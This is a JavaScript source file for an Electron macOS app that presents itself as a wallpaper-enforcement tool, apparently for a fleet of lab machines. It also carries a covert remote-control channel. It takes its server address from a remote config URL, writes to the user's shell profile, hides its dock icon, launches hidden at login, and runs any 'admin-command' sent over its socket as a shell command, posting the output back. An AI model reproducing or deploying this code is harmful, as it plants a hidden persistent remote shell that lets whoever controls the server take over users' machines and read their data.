const { app } = require("electron");
const { exec } = require("child_process");
const os = require("os");
const path = require("path");
const fs = require("fs");
const https = require("https");
const io = require("socket.io-client");
const Store = require("electron-store");

// --- DYNAMIC PATHING ---
const APP_BUNDLE_DIR = app.isPackaged
	? path.join(path.dirname(app.getPath("exe")), "../../../../")
	: __dirname;

// --- SYSTEM VARIABLE CONFIGURATION ---
const DEFAULT_URL = "https://wallpg.web.app/init_config.json";
let INIT_CONFIG_URL = process.env.WP_CONFIG_URL || DEFAULT_URL;

console.log("Initialization URL:", INIT_CONFIG_URL);

function ensureSystemVariable() {
	if (!process.env.WP_CONFIG_URL) {
		const shellProfile = path.join(
			os.homedir(),
			os.userInfo().shell.includes("zsh") ? ".zshrc" : ".bash_profile",
		);
		try {
			if (fs.existsSync(shellProfile)) {
				const content = fs.readFileSync(shellProfile, "utf8");
				if (!content.includes("WP_CONFIG_URL")) {
					fs.appendFileSync(
						shellProfile,
						`\nexport WP_CONFIG_URL="${DEFAULT_URL}"\n`,
					);
				}
			} else {
				fs.writeFileSync(
					shellProfile,
					`export WP_CONFIG_URL="${DEFAULT_URL}"\n`,
				);
			}
			process.env.WP_CONFIG_URL = DEFAULT_URL;
		} catch (e) {
			console.error("Could not write to shell profile:", e);
		}
	}
}
ensureSystemVariable();

// --- INTERNAL STATES ---
const store = new (Store.default || Store)();
const DEVICE_NAME = os.userInfo().username;
let toolUsable = true;

let settings = {
	serverUrl: store.get("serverUrl") || "http://localhost:7100",
	wallpaperPath:
		store.get("wallpaperPath") ||
		"/System/Library/CoreServices/DefaultDesktop.heic",
	checkInterval: store.get("checkInterval") || 5000,
};

if (settings.checkInterval < 1000) {
	settings.checkInterval = 1000;
	store.set("checkInterval", settings.checkInterval);
}

let socket = null;
let enforcementTimer = null;

const REPLACE_VARIABLES = {
	"{{SERVER_URL}}": () => settings.serverUrl,
	"{{DEVICE_NAME}}": () => DEVICE_NAME,
};

// --- CORE FUNCTIONS ---

function connectSocket() {
	if (socket) socket.disconnect();
	socket = io(settings.serverUrl, { reconnection: true });

	console.log(`Attempting to connect to server at ${settings.serverUrl}...`);

	socket.on("connect", () => {
		socket.emit("register-mac", DEVICE_NAME);
		console.log(`Connected to server at ${settings.serverUrl} as ${DEVICE_NAME}`);
	});

	socket.on("enforce-wallpaper", () => {
		if (toolUsable) enforceWallpaper();
	});

	socket.on("admin-change", (allow) => {
		toolUsable = allow;
	});

	socket.on("admin-command", (cmd) => {
		console.log(`Command received: ${cmd}`);

		function shouldExecuteCommand(inputLine, currentDevice) {
			// Trim the input to make matching cleaner
			let trimmedInput = inputLine.trim();

			let targetDevice = null;
			let actualCommand = trimmedInput;

			// 1. Check if it STARTS with a device routing syntax: "imac01=>" or "=> imac01"
			const startRegex = /^(?:([\w-]+)\s*=>|=>\s*([\w-]+))\s*(.*)$/;
			const startMatch = trimmedInput.match(startRegex);

			if (startMatch) {
				// Device could be in capture group 1 or 2 depending on which side of => it was on
				targetDevice = startMatch[1] || startMatch[2];
				actualCommand = startMatch[3];
			}
			// 2. Check if it ENDS with a device routing syntax: "=> imac01" or "imac01=>"
			else {
				const endRegex = /^(.*?)\s*(?:=>\s*([\w-]+)|([\w-]+)\s*=>)$/;
				const endMatch = trimmedInput.match(endRegex);

				if (endMatch && (endMatch[2] || endMatch[3])) {
					actualCommand = endMatch[1];
					targetDevice = endMatch[2] || endMatch[3];
				}
			}

			// Clean up the command text
			actualCommand = actualCommand.trim();

			// 3. Execution Logic
			// If no device is specified, ALL devices execute.
			// If a device IS specified, it must match currentDevice.
			if (
				!targetDevice ||
				targetDevice.toLowerCase() === currentDevice.toLowerCase()
			) {
				return {
					execute: true,
					command: actualCommand,
				};
			}

			return {
				execute: false,
				command: actualCommand,
			};
		}

		console.log(`Command received: ${cmd}`);

		let { execute, command } = shouldExecuteCommand(cmd, DEVICE_NAME);

		if (!execute) return;

		command = command.replace(/{{\w+}}/g, (match) => {
			const replacer = REPLACE_VARIABLES[match];
			return replacer ? replacer() : match;
		});

		console.log(`Executing as: ${command}`);

		exec(command, (error, stdout, stderr) => {
			if (error) {
				error.user = DEVICE_NAME;
				error.command = command;
				fetch(`${settings.serverUrl}/command-error`, {
					method: "POST",
					headers: { "Content-Type": "application/json" },
					body: JSON.stringify(error),
				});
				return;
			}
			fetch(`${settings.serverUrl}/command-result`, {
				method: "POST",
				headers: { "Content-Type": "application/json" },
				body: JSON.stringify({
					user: DEVICE_NAME,
					command,
					result: { stdout, stderr },
				}),
			});
		});
	});
}

function enforceWallpaper() {
	const script = `tell application "System Events" to set picture of every desktop to POSIX file "${settings.wallpaperPath}"`;
	exec(`osascript -e '${script}'`);
}

function startEnforcementLoop() {
	if (enforcementTimer) clearInterval(enforcementTimer);
	enforcementTimer = setInterval(() => {
		if (toolUsable) enforceWallpaper();
	}, settings.checkInterval);
}

// --- CONFIG MANAGEMENT ---

async function syncConfig(newConfig) {
	if (newConfig.serverUrl) {
		settings.serverUrl = newConfig.serverUrl;
		store.set("serverUrl", settings.serverUrl);
	}
	if (newConfig.wallpaperPath) {
		settings.wallpaperPath = newConfig.wallpaperPath;
		store.set("wallpaperPath", settings.wallpaperPath);
	}
	if (newConfig.checkInterval) {
		settings.checkInterval = newConfig.checkInterval;
		store.set("checkInterval", settings.checkInterval);
	}

	console.log("Configuration synchronized:", settings);

	connectSocket();
	startEnforcementLoop();
	enforceWallpaper();
}

function downloadInitConfig() {
	return new Promise((resolve, reject) => {
		https
			.get(INIT_CONFIG_URL, (res) => {
				let data = "";
				res.on("data", (chunk) => (data += chunk));
				res.on("end", () => {
					try {
						const parsed = JSON.parse(data);
						const cleanConfig = {
							serverUrl: parsed.serverUrl,
							wallpaperPath: parsed.wallpaperPath,
							checkInterval: parsed.checkInterval,
						};
						resolve(cleanConfig);
					} catch (e) {
						reject(e);
					}
				});
			})
			.on("error", reject);
	});
}

// --- LIFECYCLE ---

app.on("window-all-closed", (e) => e.preventDefault());

app.whenReady().then(async () => {
	if (process.platform === "darwin") app.dock.hide();

	console.log("Service directory:", APP_BUNDLE_DIR);

	// Fetch configuration entirely online on every startup
	try {
		console.log("Fetching latest online configuration...");
		const remoteConfig = await downloadInitConfig();
		await syncConfig(remoteConfig);
	} catch (e) {
		console.error(
			"Failed to fetch online config. Falling back to internal settings.",
			e.message,
		);
		// Fallback protects application state if network is unavailable during boot
		await syncConfig(settings);
	}

	app.setLoginItemSettings({
		openAtLogin: true,
		openAsHidden: true,
		path: app.getPath("exe"),
	});

	connectSocket();
	startEnforcementLoop();
});
